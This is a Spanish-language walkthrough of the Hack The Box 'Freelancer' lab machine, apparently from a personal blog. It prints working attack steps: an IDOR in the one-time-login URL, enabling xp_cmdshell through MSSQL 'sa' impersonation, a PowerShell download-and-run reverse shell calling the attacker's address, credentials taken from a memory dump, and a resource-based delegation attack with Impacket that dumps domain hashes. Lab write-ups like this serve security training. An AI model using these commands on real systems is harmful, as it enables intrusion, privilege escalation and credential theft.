---
title: "HTB: Freelancer WriteUp 🪟"
date: 2024-10-06
tags:
  - "#ActiveDirectory"
  - "#IDOR"
  - "#MSSQL"
  - "#evil-winrm"
  - "#RecycleBin"
  - "#BackUp"
  - "#nmap"
  - "#smb"
description: All the services are free, a source code this site placed on github repository and intergration with netlify service, another service that you can use is github page for hosting your own static site.
---
---

# Freelancer 

"Freelancer" es una máquina de dificultad alta diseñada para desafiar a los jugadores con vulnerabilidades comunes en pruebas de penetración del mundo real. Cubre habilidades como la identificación de fallos de lógica empresarial en aplicaciones web, la explotación de vulnerabilidades comunes como IDOR y el bypass de autorización, y ataques de suplantación de SQL. Los jugadores enfrentan escenarios como la exposición de información sensible a través de enumeración de directorios y la construcción manual de consultas SQL. Se introducen técnicas avanzadas, como la ejecución remota de código y forense de memoria en Windows, con un enfoque especial en ataques de Active Directory. Esto incluye la explotación del "Recycle Bin" de AD y el grupo de "Backup Operators". También se abordan técnicas como el password spraying, cracking de hashes y el bypass de herramientas antivirus, ofreciendo una experiencia integral que pone a prueba técnicas básicas y avanzadas de pruebas de penetración.

<hr>

<figure>
<img src="/assets/img/Freelancer/Freelancer.png" alt="Freelancer">
<figcaption>Fig 1. Freelancer - HTB</figcaption>
</figure>

---

### Análisis de Puertos y Enumeración en Freelancer HTB


---

Iniciamos nuestro análisis realizando un escaneo de puertos con la herramienta **Nmap**, que nos revela una serie de puertos abiertos. Observamos que varios de ellos son comunes en un entorno de **Active Directory**, y nos llama la atención la presencia del puerto **80**, lo que sugiere que podría haber oportunidades para realizar **hacking web**. Para guiarnos en esta dirección, consideramos que el **Framework OWASP** es una excelente referencia.

El comando que utilizamos para escanear todos los puertos de manera rápida, muy popular en la comunidad hispanohablante, es el siguiente:

```zsh
nmap -p- --open --min-rate 5000 -sS -f -Pn -n [IP] -oG puertos
```

Esta técnica es altamente efectiva, ya que nos permite realizar un escaneo veloz, ideal para resolver **CTFs** de forma eficiente.


<figure>
<img src="/assets/img/Freelancer/imagen1.png">
</figure>

---

A continuación, utilizamos **Nmap** para realizar un escaneo específico en los puertos identificados previamente, con el objetivo de detectar versiones de servicios. Si encontramos un servicio obsoleto, es posible que descubramos alguna vulnerabilidad. 

En el puerto **55297**, nos topamos con un servidor **MSSQL** de la versión **2019**, lo que puede presentar ciertas oportunidades para la explotación. Además, hemos obtenido el nombre de dominio: **`freelancer.htb`**, sugiriendo que podría haber un recurso compartido a nivel de red. 

```zsh
nmap -plista_de_puertos -sS -sCV -f -Pn -n ip -oN objetivos.txt
```

<figure>
<img src="/assets/img/Freelancer/imagen2.png" alt="MSSQL Server">
</figure>

El servidor utiliza **SMB versión 2**. También observamos que el puerto **80** está habilitado y nos redirige a **`http://freelancer.htb/`**. 

Es momento de enumerar el servicio **SMB**, pero lamentablemente no tenemos éxito, ya que no contamos con el usuario **guest**. 

<figure>
<img src="/assets/img/Freelancer/imagen3.png" alt="Enumeración SMB">
</figure>

Al acceder a la página web, encontramos que se presenta como "la mejor plataforma para conseguir tu próximo trabajo", permitiendo que las personas trabajen como freelancers. 

<figure>
<img src="/assets/img/Freelancer/imagen4.png" alt="Página Principal Freelancer">
</figure>

Para avanzar, emplearé **FFUF** para realizar un escaneo de subdirectorios y subdominios. En caso de que no obtengamos resultados, será crucial acceder al sitio y buscar información manualmente. 

<figure>
<img src="/assets/img/Freelancer/imagen5.png" alt="Escaneo con FFUF">
</figure>

Mientras llevamos a cabo el escaneo con **FFUF**, también debemos interactuar con la página web para ver si encontramos algo de interés. El comando que utilizaremos es el siguiente:

```zsh
ffuf -u http://freelancer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
```

Mientras esperamos las respuestas de **FFUF**, comenzamos a explorar el sitio para obtener una visión más clara de a qué nos enfrentamos. Notamos que tenemos la opción de registrarnos tanto como **freelancer** como **empresa**.

<figure>
<img src="/assets/img/Freelancer/imagen6.png" alt="Registro en Freelancer">
</figure>

También existe la posibilidad de suscribirnos a un **newsletter**.

<figure>
<img src="/assets/img/Freelancer/imagen7.png" alt="Suscripción a Newsletter">
</figure>

Mientras tanto, nuestro escaneo de subdirectorios ha revelado varios resultados interesantes.

<figure>
<img src="/assets/img/Freelancer/imagen8.png" alt="Subdirectorios Encontrados">
</figure>

Uno de los subdirectorios que destaca es **/admin**, aunque lamentablemente no hemos obtenido respuesta del servidor al intentar acceder a él.

<figure>
<img src="/assets/img/Freelancer/imagen9.png" alt="Acceso a Admin">
</figure>

Decidimos proceder creando una cuenta como **freelancer**. Si no encontramos información útil, luego intentaremos crear una cuenta como **empresa**. Para ello, generamos una cuenta con información falsa, dado que se trata de un entorno controlado y no consideramos necesario usar datos reales.

<figure>
<img src="/assets/img/Freelancer/imagen10.png" alt="Registro como Freelancer">
</figure>

Al parecer, el escaneo con **FFUF** provoca que el servidor se caiga, lo que sugiere que no está diseñado para buscar dominios o subdominios. Una vez que creamos nuestra cuenta, nos redirigieron a la página de inicio de sesión, donde ingresamos nuestras credenciales y accedimos al subdirectorio de búsqueda de trabajos, que es bastante similar a **HackerOne**.

<figure>
<img src="/assets/img/Freelancer/imagen11.png" alt="Búsqueda de Trabajo">
</figure>

Al aplicar para un trabajo, se nos presenta una página con información sobre el puesto, el salario, etc. Sin embargo, al observar detenidamente la URL, notamos que se estructura con `id=`, lo que nos da la oportunidad de probar una técnica de **IDOR** (Insecure Direct Object Reference).

<figure>
<img src="/assets/img/Freelancer/imagen12.png" alt="Detalles del Trabajo">
</figure>
<figure>
<img src="/assets/img/Freelancer/imagen13.png" alt="URL con ID">
</figure>

Si cambiamos el **ID**, el servidor nos redirige a otro trabajo. Voy a empezar a jugar con esto en busca de algo interesante. Sin embargo, hasta ahora no he encontrado nada destacable; todos los trabajos propuestos son similares. A partir de la opción número 13, el recurso no estará disponible.

<figure>
<img src="/assets/img/Freelancer/imagen14.png" alt="Propuestas de Trabajo">
</figure>

Después de un tiempo buscando información, no hemos obtenido resultados relevantes. Así que es hora de crear una cuenta como **empresa**, que es la única de nuestras tres opciones principales que aún no hemos probado.

Al intentar crear una cuenta como **empresa**, nos encontramos con la siguiente notificación:

<figure>
<img src="/assets/img/Freelancer/imagen15.png" alt="Notificación de Registro">
</figure>

Procedemos a crear la cuenta de empresa de la misma manera que lo hicimos al registrarnos como **freelancer**.

<figure>
<img src="/assets/img/Freelancer/imagen16.png" alt="Registro como Empresa">
</figure>

Sin embargo, nos encontramos con un error al intentar completar la creación de la cuenta.

<figure>
<img src="/assets/img/Freelancer/imagen17.png" alt="Error en Registro">
</figure>

Parece que ambos tipos de cuentas utilizan la misma base de datos, por lo que decidimos crear una cuenta con un nombre diferente.

<figure>
<img src="/assets/img/Freelancer/imagen18.png" alt="Nuevo Intento de Registro">
</figure>

Al intentar iniciar sesión, recibimos el siguiente mensaje de error:

<figure>
<img src="/assets/img/Freelancer/imagen19.png" alt="Mensaje de Error al Iniciar Sesión">
</figure>

A pesar de esperar un rato, no obtuve éxito y seguía recibiendo el mismo mensaje. Por lo tanto, decidimos intentar la opción de recuperación de cuenta para ver si podíamos obtener acceso de esa manera.

<figure>
<img src="/assets/img/Freelancer/imagen20.png" alt="Opción de Recuperación de Cuenta">
</figure>

Iniciamos el proceso para resetear la contraseña, lo que nos redirige nuevamente a la página de inicio de sesión. Allí ingresamos nuestro nombre de usuario y la nueva contraseña que acabamos de crear.

<figure>
<img src="/assets/img/Freelancer/imagen21.png" alt="Ingreso de Nuevas Credenciales">
</figure>

---

### Descubriendo Vulnerabilidades en el Sitio

Mientras navegaba por el sitio, no encontraba ninguna vulnerabilidad o pista que me llamara la atención. Sin embargo, al investigar más a fondo, descubrí una vulnerabilidad de tipo **IDOR** (Insecure Direct Object Reference) en el código QR. Esta opción era nueva para mí, así que decidí escanear el código y obtuve la siguiente dirección URL:

`http://freelancer.htb/accounts/login/otp/MTAwMTE=/2adb754a03a3a8693ef2b04b6f0b39e0/`

La URL contiene una cadena en **Base64**, la cual debemos decodificar. A simple vista, es evidente que la cadena está codificada en Base64, y a su lado hay un hash que podría ser **MD5**.

<figure>
<img src="/assets/img/Freelancer/imagen23.png" alt="URL con Base64">
</figure>

Sin embargo, no estoy seguro de si esta información será útil, así que continúo buscando algún indicio que me llame la atención. Observé que el subdirectorio **/blog** también presenta un problema de **IDOR**, así que decidí explorar entre los blogs.

<figure>
<img src="/assets/img/Freelancer/imagen24.png" alt="Blogs Disponibles">
</figure>

Al hacer clic en un usuario, descubrí que podía navegar entre diferentes perfiles.

<figure>
<img src="/assets/img/Freelancer/imagen25.png" alt="Navegación entre Usuarios">
</figure>

La URL correspondiente era:

`http://freelancer.htb/accounts/profile/visit/5/`

Al parecer, `crista.w` es el usuario número 5, y nosotros somos el usuario número 10011, como descubrimos anteriormente.

<figure>
<img src="/assets/img/Freelancer/imagen26.png" alt="Perfil del Usuario">
</figure>

Decidí navegar entre los IDs para identificar el ID de nuestro usuario administrador. Lo lógico era probar con números bajos, ya que se supone que el primer usuario en registrarse tendría el identificador 1. Sin embargo, al intentarlo, recibí un error 404: **Page Not Found**.

<figure>
<img src="/assets/img/Freelancer/imagen27.png" alt="Error 404">
</figure>

Al probar con el ID 2, obtuve el identificador del usuario **admin**.

<figure>
<img src="/assets/img/Freelancer/imagen28.png" alt="Perfil del Usuario Admin">
</figure>

Ahora debemos modificar nuestra URL. Para ello, necesitamos codificar el número 2 en **Base64**, lo cual podemos hacer en nuestra terminal o usando **CyberChef**.

<figure>
<img src="/assets/img/Freelancer/imagen29.png" alt="Codificación en Base64">
</figure>

La URL original era:

`http://freelancer.htb/accounts/login/otp/MTAwMTE=/2adb754a03a3a8693ef2b04b6f0b39e0/`

Ahora, la modificamos para que contenga el ID de nuestro usuario administrador, cambiando la URL a:

`http://freelancer.htb/accounts/login/otp/Mgo=/2adb754a03a3a8693ef2b04b6f0b39e0/`

Sin embargo, esto no funcionará porque el código QR es válido solo por 5 minutos. Así que volvemos a escanear el código y obtendremos otro hash MD5, pero el ID se mantiene:

`http://freelancer.htb/accounts/login/otp/Mgo=/fa6b20773398ca14da20421f4026c172/`

Con esto, logramos acceder como **usuario administrador**.

<figure>
<img src="/assets/img/Freelancer/imagen30.png" alt="Acceso como Administrador">
</figure>

---

### MSSQL Injection

Recordemos que con **ffuf** encontramos un subdirectorio llamado **admin**, el cual podría ser útil en este momento.

<figure>
<img src="/assets/img/Freelancer/imagen31.png" alt="Subdirectorio Admin">
</figure>

En este punto, tenemos acceso a una terminal SQL.

<figure>
<img src="/assets/img/Freelancer/imagen32.png" alt="Terminal SQL">
</figure>

Como nuestra base de datos es de **Microsoft SQL Server**, es esencial conocer la sintaxis adecuada. El nombre de nuestra base de datos es:

<figure>
<img src="/assets/img/Freelancer/imagen33.png" alt="Nombre de la Base de Datos">
</figure>

Estamos dentro de esta base de datos, así que es hora de hacer algunas consultas. Puedes consultar [este recurso](https://support.microsoft.com/es-es/topic/access-sql-conceptos-b%C3%A1sicos-vocabulario-y-sintaxis-444d0303-cde1-424e-9a74-e8dc3e460671) para más información sobre la sintaxis de SQL Server. Con la ayuda de ChatGPT, comencé a hacer algunas peticiones para encontrar información.

<figure>
<img src="/assets/img/Freelancer/imagen34.png" alt="Consultas SQL">
</figure>

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_type = 'BASE TABLE';
```

Es hora de utilizar **Métodos de Transferencia de Archivos en Windows**. Dado que no tenemos privilegios, es el momento de obtener una **reverse shell** utilizando **IEX**. Para ello, necesitamos crear un archivo con la extensión **.ps1** para que se ejecute. Podemos pedirle a ChatGPT que genere el script para PowerShell. 

Iniciamos un servidor con **Python**:

<figure>
<img src="/assets/img/Freelancer/imagen35.png" alt="Servidor Python">
</figure>

Escuchamos en el puerto que deseamos:

<figure>
<img src="/assets/img/Freelancer/imagen36.png" alt="Escucha en el Puerto">
</figure>

Ejecutamos el siguiente código en la base de datos:

<figure>
<img src="/assets/img/Freelancer/imagen37.png" alt="Código SQL">
</figure>

```sql
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://tu_ip:puerto/shell.ps1')"';
```

Recuerda modificar la IP, el puerto y el nombre de tu archivo. Si no funciona, intentamos con **iwr** o **Invoke-WebRequest**.

<figure>
<img src="/assets/img/Freelancer/imagen38.png" alt="Error en la Solicitud">
</figure>

```sql
EXEC xp_cmdshell 'powershell -c "IEX (iwr -usebasicparsing http://10.10.14.11:8000/reverse-powershell.ps1)"';
```

Sin embargo, encontramos un error. Para habilitar **xp_cmdshell**, necesitamos ejecutar algunos comandos previos en MSSQL para obtener privilegios en la base de datos. 

Aquí hay un desglose de los pasos:

#### 1. Obtener el nombre del propietario de cada base de datos
```sql
SELECT suser_sname(owner_sid) FROM sys.databases;
```
- **`sys.databases`**: Contiene información sobre cada base de datos en el servidor.
- **`owner_sid`**: Identificador de seguridad del propietario de la base de datos.

#### 2. Verificar si el usuario es un `sysadmin`
```sql
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
```
- **`EXECUTE AS LOGIN = 'sa'`**: Cambia el contexto de ejecución al usuario `sa`.
- **`IS_SRVROLEMEMBER('sysadmin')`**: Verifica si el usuario actual es miembro del rol `sysadmin`.

#### 3. Conceder privilegios a otro usuario
```sql
EXECUTE AS LOGIN = 'sa';
EXEC sp_addsrvrolemember 'Freelancer_webapp_user', 'sysadmin';
```
- **`EXEC sp_addsrvrolemember`**: Agrega al usuario `Freelancer_webapp_user` al rol `sysadmin`, otorgándole privilegios administrativos.

#### 4. Confirmar la membresía en el rol `sysadmin`
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```
- Verifica si `Freelancer_webapp_user` ahora tiene privilegios de `sysadmin`.

### Habilitar `xp_cmdshell`
Para habilitar **xp_cmdshell**, ejecutamos los siguientes comandos:

```sql
EXEC sp_configure 'show advanced options', '1';
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
```

Finalmente, logramos obtener nuestra **reverse shell**.

<figure>
<img src="/assets/img/Freelancer/imagen40.png" alt="Reverse Shell Obtenida">
</figure>

---

## Enumeración de Usuarios y Verificación de Credenciales

Hemos recopilado información sobre los usuarios del sistema utilizando el comando `net users` y también al explorar el directorio de usuarios. A continuación, se presentan las imágenes que muestran la enumeración de usuarios:

<figure>
    <img src="/assets/img/Freelancer/imagen41.png" alt="Usuarios enumerados">
</figure>
<figure>
    <img src="/assets/img/Freelancer/imagen42.png" alt="Directorio de usuarios">
</figure>

Creé un archivo con todos los usuarios encontrados para llevar un mejor control de la información:

<figure>
    <img src="/assets/img/Freelancer/imagen43.png" alt="Archivo de usuarios">
</figure>

Ahora es momento de comenzar la enumeración para encontrar más detalles sobre las credenciales disponibles:

<figure>
    <img src="/assets/img/Freelancer/imagen44.png" alt="Configuración de base de datos">
</figure>

Encontramos una configuración de la base de datos que incluye una posible contraseña. La contraseña sospechosa es `IL0v3ErenY3ager`. Utilizaremos `crackmapexec` para verificar si realmente esta contraseña corresponde a alguno de los usuarios enumerados.

```zsh
crackmapexec smb <ip> -u users -p "IL0v3ErenY3ager"
```

Después de ejecutar el comando, descubrimos que las credenciales pertenecen al usuario **mikasaAckerman**:

<figure>
    <img src="/assets/img/Freelancer/imagen46.png" alt="Credenciales encontradas">
</figure>

---

## Movimiento Lateral

Con las credenciales válidas en mano, el siguiente paso es verificar si podemos ejecutar comandos de forma remota. Intentamos utilizar el módulo `smb/psexec` de Meterpreter, pero no tuvimos éxito:

<figure>
    <img src="/assets/img/Freelancer/imagen47.png" alt="Intento de usar Meterpreter">
</figure>

También probamos con WinRM, pero no logramos establecer conexión:

<figure>
    <img src="/assets/img/Freelancer/imagen48.png" alt="Intento de usar WinRM">
</figure>

Es momento de utilizar **Runas** para realizar movimiento lateral. Primero, hacemos una copia del archivo que necesitamos:

<figure>
    <img src="/assets/img/Freelancer/imagen49.png" alt="Copia del archivo">
</figure>

Luego, nos dirigimos a la memoria temporal y comenzamos un servidor SMB con soporte para SMB 2:

<figure>
    <img src="/assets/img/Freelancer/imagen50.png" alt="Servidor SMB">
</figure>

El usuario tiene el ticket preautenticado, pero cuando intentamos copiar el archivo, no funciona:

<figure>
    <img src="/assets/img/Freelancer/imagen52.png" alt="Error al copiar el archivo">
</figure>

Dado que el servidor SMB no funcionó, optamos por utilizar **certutil**, lo que resultó exitoso:

<figure>
    <img src="/assets/img/Freelancer/imagen53.png" alt="Uso de certutil">
</figure>

A continuación, ejecutamos el siguiente comando para realizar el movimiento lateral, escuchando en el puerto correspondiente:

```bash
.\Runas.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.14.11:9001
```

Sin embargo, no funcionó, así que decidí utilizar **RunasCs** como alternativa:

<figure>
    <img src="/assets/img/Freelancer/imagen54.png" alt="Uso de RunasCs">
</figure>
<figure>
    <img src="/assets/img/Freelancer/imagen55.png" alt="Resultado de RunasCs">
</figure>

---

## Herramienta Forense y Nuevas Habilidades

Transferimos el archivo a nuestra máquina host y lo descomprimimos. Después de varios días intentando extraer la información del archivo **MEMORY.DMP**, que es un volcado de memoria, logramos entender que este tipo de archivo es una captura del estado de la memoria de un sistema o proceso específico. Generalmente, estos archivos se generan cuando ocurre un error en un programa o sistema operativo.

### Tipos Comunes de Archivos **.DMP**

1. **Volcado de memoria completo (Complete Memory Dump):** Captura toda la memoria física del sistema en el momento del fallo, incluyendo tanto la memoria usada como la no utilizada. Estos archivos suelen ser bastante grandes.

2. **Volcado de memoria pequeña (Small Memory Dump):** Solo captura información mínima, como los controladores y los módulos de software activos durante el fallo. Estos archivos son más pequeños (normalmente 64 KB).

3. **Volcado de memoria del kernel (Kernel Memory Dump):** Captura únicamente la memoria utilizada por el kernel y los controladores del sistema. No incluye la memoria de las aplicaciones en modo de usuario, por lo que es más pequeño que un volcado completo, pero contiene suficiente información para diagnosticar problemas relacionados con el núcleo del sistema.

4. **Volcados de procesos (User-Mode Dump):** Se generan cuando un proceso específico falla, capturando solo la memoria utilizada por ese proceso en el momento del fallo.

Para más detalles, este video de Hackavis te da una idea clara de lo que tenemos que realizar: [Hackavis Video](https://youtu.be/27bWVTLsGCk). Aquí también está el repositorio de la herramienta: [Volatility 3 en GitHub](https://github.com/volatilityfoundation/volatility3).

<figure>
    <img src="/assets/img/Freelancer/imagen57.png" alt="Repositorio de Volatility">
</figure>

Clonamos el repositorio y accedemos a **volatility3**. Es probable que tengamos problemas al instalar los requerimientos:

<figure>
    <img src="/assets/img/Freelancer/imagen59.png" alt="Problemas de instalación">
</figure>

Por lo tanto, creamos un entorno virtual con los siguientes comandos:

```bash
python3 -m venv venv
source venv/bin/activate
```

Ahora podemos instalar las dependencias necesarias:

```bash
pip install -r requirements.txt
```

Es momento de utilizar la herramienta con el siguiente comando:

```bash
python vol.py -f ~/Hackthebox/windows/hard/Freelancer/volcado/MEMORY.DMP windows.lsadump | awk '{print $1, $2}'
```

<figure>
    <img src="/assets/img/Freelancer/imagen60.png" alt="Uso de la herramienta Volatility">
</figure>

Hemos encontrado lo que parece ser una contraseña: `PWN3D#l0rr@Armessa199`. Ahora, utilizamos **CrackMapExec** para determinar a quién pertenecen dichas credenciales:

```bash
crackmapexec smb 10.10.11.5 -u users -p 'PWN3D#l0rr@Armessa199'
```

Y efectivamente, tenemos credenciales totalmente válidas:

<figure>
    <img src="/assets/img/Freelancer/imagen61.png" alt="Credenciales válidas">
</figure>

Verificamos que el usuario **lorra199** pertenezca al grupo de **Remote Manage Users**:

<figure>
    <img src="/assets/img/Freelancer/imagen62.png" alt="Verificación del grupo de usuarios">
</figure>

¡Lo hemos conseguido! (Siempre que tengamos **Pwn3d!** significa que podemos utilizar **Evil-WinRM**).


---

## Escalación de Privilegios

<figure>
    <img src="/assets/img/Freelancer/imagen63.png" alt="Acceso como lorra199">
</figure>

Ya tenemos acceso como **lorra199**, pero el movimiento lateral no creo que termine aquí:

<figure>
    <img src="/assets/img/Freelancer/imagen64.png" alt="Movimiento lateral">
</figure>

Todavía tenemos al usuario **lkazanof**, al que aún no hemos tenido acceso. Actualmente, no contamos con ningún privilegio:

<figure>
    <img src="/assets/img/Freelancer/imagen65.png" alt="Sin privilegios">
</figure>

Antes de utilizar **BloodHound-Python**, podemos hacer un escaneo manual para ver a qué grupo pertenecemos:

<figure>
    <img src="/assets/img/Freelancer/imagen66.png" alt="Grupos de usuario">
</figure>

Pertenecemos al grupo **AD Recycle Bin**. Vamos a utilizar un ataque de **Resource-Based Constrained Delegation**. Para ello, utilizaremos **Impacket**.

### 1. Creación del Objeto de Computadora

Ejecutamos el siguiente comando para crear un nuevo objeto de computadora llamado `ANSW3R$` en el dominio:

```bash
impacket-addcomputer -computer-name 'ANSW3R$' -computer-pass 'Fuego123@' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
```

**Explicación:** Este comando crea un nuevo objeto de computadora, y la contraseña de la computadora es `'Fuego123@'`. Una vez creado, este objeto puede actuar en nombre de otros objetos en el dominio.

<figure>
    <img src="/assets/img/Freelancer/imagen67.png" alt="Creación de objeto de computadora">
</figure>

### 2. Delegación de Permisos

Ejecutamos el siguiente comando para otorgar derechos de delegación:

```bash
impacket-rbcd -delegate-from 'ANSW3R$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```

**Explicación:** Este comando permite que `ATTACKERSYSTEM$` actúe en nombre de otros usuarios en el **DC**. La salida indica que los derechos de delegación se modificaron exitosamente.

### 3. Sincronización del Sistema

Detenemos el servicio de sincronización de tiempo y sincronizamos manualmente con el siguiente comando:

```bash
systemctl stop systemd-timesyncd
ntpdate -u 10.10.11.5
```

<figure>
    <img src="/assets/img/Freelancer/imagen68.png" alt="Sincronización del sistema">
</figure>

### 4. Obtención del Ticket

Solicitamos un ticket de servicio (S4U) para impersonar al administrador con el siguiente comando:

```bash
impacket-getST -spn 'cifs/DC.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 'freelancer.htb/ANSW3R$:Fuego123@'
```

Este ticket se guarda en `Administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache`, que es un archivo de caché de credenciales **Kerberos**.

<figure>
    <img src="/assets/img/Freelancer/imagen69.png" alt="Obtención de ticket">
</figure>

### 5. Exportar Archivo

Exportamos el archivo de caché con el siguiente comando:

```bash
export KRB5CCNAME=Administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache
```

<figure>
    <img src="/assets/img/Freelancer/imagen70.png" alt="Exportar archivo de caché">
</figure>

### 6. Uso de **Impacket Secretsdump**

Utilizamos **impacket-secretsdump** para obtener los hashes NTLM del **DC**:

```bash
impacket-secretsdump 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
```

<figure>
    <img src="/assets/img/Freelancer/imagen71.png" alt="Uso de impacket-secretsdump">
</figure>

Ahora debemos comprobar si realmente son los hashes NTLM del **DC**:

<figure>
    <img src="/assets/img/Freelancer/imagen72.png" alt="Verificación de hashes NTLM">
</figure>

Parece que sí:

<figure>
    <img src="/assets/img/Freelancer/imagen73.png" alt="Hashes verificados">
</figure>

Hemos conseguido la bandera de **root**, pero no del usuario. ¡Jajajaja! Me acabo de dar cuenta de que la bandera del usuario la tenía el usuario **mikasaAckerman**:

<figure>
    <img src="/assets/img/Freelancer/imagen74.png" alt="Bandera del usuario">
</figure>

Y eso sería todo.

---

